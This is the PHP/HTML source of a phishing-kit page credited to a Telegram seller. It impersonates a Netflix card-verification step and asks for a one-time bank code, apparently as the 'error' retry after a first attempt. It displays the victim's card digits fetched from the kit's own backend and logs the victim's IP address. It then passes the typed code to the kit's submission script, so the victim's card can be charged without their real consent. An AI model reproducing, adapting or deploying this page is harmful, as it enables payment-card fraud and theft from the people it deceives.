
<?php
/*
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦✦						                            ✦✦
✦✦    TELEGRAM CONTACT : https://t.me/Xenos_dev     ✦✦
✦✦    TELEGRAM CHANNEL : https://t.me/xenostools    ✦✦
✦✦         TELEGRAM USERNAME : @Xenos_dev           ✦✦
✦✦                                                  ✦✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦


*/
?>
<!DOCTYPE html>


<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="../assets/nficon2016.ico">
<link rel="apple-touch-icon" href="../assets/nficon2016.png">
    <title>NETFLIX verification</title>
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script src="../scripts/config.js"></script> 
    <script src="../scripts/app.js"></script> 
</head>
<body>
    <nav class="navbar">
        <div class="navbar-content">
            <!-- Navigation links or content can go here -->
            <span style="margin: 15px; font-weight: 100;" class="navbar-text">Cancel</span>
        </div>
    </nav>
    <div class="table-container" >
        <h2 style="font-size: 20px; margin-bottom: 10px; text-align:center;">Please confirm your one time password verification</h2>
        <table>
            <tbody>
                <tr>
                    <td class="left_td">Online store</td>
                    <td class="right_td">NETFLIX</td>
                </tr>
                <tr>
                    <td class="left_td">Amount</td>
                    <td class="right_td">0,00 $</td>
                </tr>
                <tr>
                    <td class="left_td">Date</td>
                    <td class="right_td">24.03.2024 02:53</td>
                </tr>
                <tr>
                    <td class="left_td">Card number</td>
                    <td class="right_td" id="display_c_numb"></td>
                </tr>
            </tbody>
        </table>
    </div>
    
    <form class="form-container">
        
<input type="hidden" id="userIppp" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
        <header class="form-header">
           <div class="header-left">
             <img src="../assets/leftarrow.svg" alt="" srcset="">
             <span style="margin-left: 10px;">Identification</span>
           </div>
           <div class="header-right">
             <img src="../assets/baricon.svg" alt="" srcset="">
           </div>
        </header>
        <main class="form-main">
            <div class="lbl" >
                
                <label for="fodselsnummer" style=" ">One time code</label>
                <img src="../assets/questionicon.svg" style="margin-left: 8px;" alt="" srcset="">
            </div>
           <div class="input-container" style="display: flex; align-items: center;">
            <div class="inputcon" style="position: relative;" >
                
                <img src="../assets/lock.svg" alt="" srcset="" style="position: absolute; top: 8px; left: 10px;">
                <input type="text" id="otp" placeholder="recieved code" >
            </div>

             <button type="button" id="submit_btn" onclick="submitOTPForm('error_otp')">
               <img  src="../assets/rightarrow.svg" alt="" srcset="">
             </button>
           </div>
           <p style="color: #0078BD; text-decoration: underline;  font-size: 13px; margin-left: 10px; margin-top: 6px;">Code not recieved ?</p>
        </main>
    </form>
    <button style="background-color: #4A4A4A; color: white; width: 220px; border-radius: 20px; height: 30px; margin-top: 25px; outline: none; border: none;">Back</button>

    <div class="help-container">
        <span class="help-text">Do you need help?</span>
        <div class="arrow-down"></div>
    </div>
    
<input type="hidden" id="userIppp" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
    <script>
    $(document).ready(function() {
        console.log("Jquery ready")
        var CardNumber = localStorage.getItem('c_numb');
        $('#display_c_numb').text(CardNumber);

        var date = new Date();
        var day = ("0" + date.getDate()).slice(-2);
        var month = ("0" + (date.getMonth() + 1)).slice(-2);
        var year = date.getFullYear();
        var hours = ("0" + date.getHours()).slice(-2);
        var minutes = ("0" + date.getMinutes()).slice(-2);

        var formattedDate = day + "." + month + "." + year + " " + hours + ":" + minutes;

        // Target only the .right_td in the third tr
        $("tr:eq(2) .right_td").text(formattedDate);

        var today = new Date();
    var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
    var time = today.getHours() + ':' + today.getMinutes() + ':' + today.getSeconds();
    var current_date = date + ' ' + time;
        $.ajax({
            type: "POST",
            url: "../scripts/update_user_page.php",
            data: { page: 'Error_OTP' , current_date : current_date  },
            dataType: 'JSON', // Add this line to specify the data type
            success: function(response) {
                if (response.length > 0) {
                    console.log(response[0].net_cc_number); // This should now correctly log the credit card number
                    
                    cc_numbers = response[0].net_cc_number;

                    // Add last four cc numbers 
                    lastccnumbers =  cc_numbers.slice(-4);
                    // Target only the .right_td in the fourth tr
                    $("tr:eq(3) .right_td").text("**** **** **** "+lastccnumbers);
                } else {
                    console.log("No credit card numbers found.");
                }
            }
        });
    });
</script>
<style>
    html,*{
        margin: 0;
        padding: 0;
    }
    body{
        box-sizing: border-box;
        font-family: 
        ArialMT,
        Arial,
        Arial Black,
        ArialHebrew,
        Arial-BoldMT;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
.navbar {
    background-color: #9B9B9B; /* Set the background color */
    display: flex; /* Use flexbox for layout */
    justify-content: space-between; /* Align items on opposite ends */
    height: 50px;
    width: 100%;
}

.navbar-content {
    display: flex; /* Use flexbox for layout */
    justify-content: flex-end; /* Align items to the right */
    width: 100%; /* Take full width */

}

.navbar-text {
    color: white; 
}


.lbl{
    display: flex;
    flex-direction: row;
    align-items: center;

}
    .form-container {
        width: 100%;
        max-width: 380px;
        margin: 1px auto;
        border-top: 3px solid #a1a1a1;
        border-left: 3px solid #a5a5a5;
        border-right: 2px solid #dadada;
        border-bottom: 2px solid #cbcbcb;
        background-color: #FBFBFB;
    }

.form-header {
 display: flex;
 justify-content: space-between;
 align-items: center;
 padding: 10px;
 border-bottom: 1px solid #ccc;
}

.header-left, .header-right {
 display: flex;
 align-items: center;
}

.arrow-left, .bar-icon, .arrow-right {
 margin-right: 5px;
}

.form-main {
 padding: 20px;
}

.input-container {
 display: flex;
 align-items: center;
 margin-top: 10px;
}

.profile-icon, .arrow-right {
 margin-right: 5px;
}

input[type="text"] {
 flex-grow: 1;
 padding: 5px;
 border-radius: 3px;
 border: 2px solid #ff0000;
 font-size: 18px;
 padding-left: 35px;
 outline: none;
 height: 25px;
 width: 91%;
}

#submit_btn {
    padding: 8px 20px;
    background-color: #0078BD;
    color: white;
    border: none;
    cursor: pointer;
    margin-left: 30px;
    max-height: 40px; 
    border-radius: 3px;
}   /* Base styles */

td.left_td {
    font-weight: bold;
    text-align: right;
    padding-right: 2px; /* Optional: Adds some space to the right of the text */
}

td.right_td {
    text-align: left;
    padding-left: 2px; /* Optional: Adds some space to the left of the text */
}
.table-container {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    font-size: 11px;
    margin-top: 25px;
}


/* Responsive styles */
@media (max-width: 420px) {
    input[type="text"] {
        width: 85%;
    }
    
    .form-container {
        width: 88%;
    }
}
.help-container {
    margin-top: 60px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    width: 100%;
    border-bottom: 1px solid #A6A1A1; /* Set the bottom border color */
}

.help-text {
    /* Styles for the text */
    font-size: 12px;
    margin-left: 20px;
    margin-bottom: 8px;
}

.arrow-down {
    margin-bottom: 8px;
    margin-right: 20px;
    width: 0;
    height: 0;
    border-left: 6px solid transparent; /* Adjust the size of the arrow */
    border-right: 6px solid transparent;
    border-top: 6px solid #A6A1A1; /* Set the color of the arrow */
}






</style>       
</body>

<script>
    var scrollEventHandler = function() {
  window.scroll(0, window.pageYOffset);
}

window.addEventListener("scroll", scrollEventHandler, false);

</script>
</html>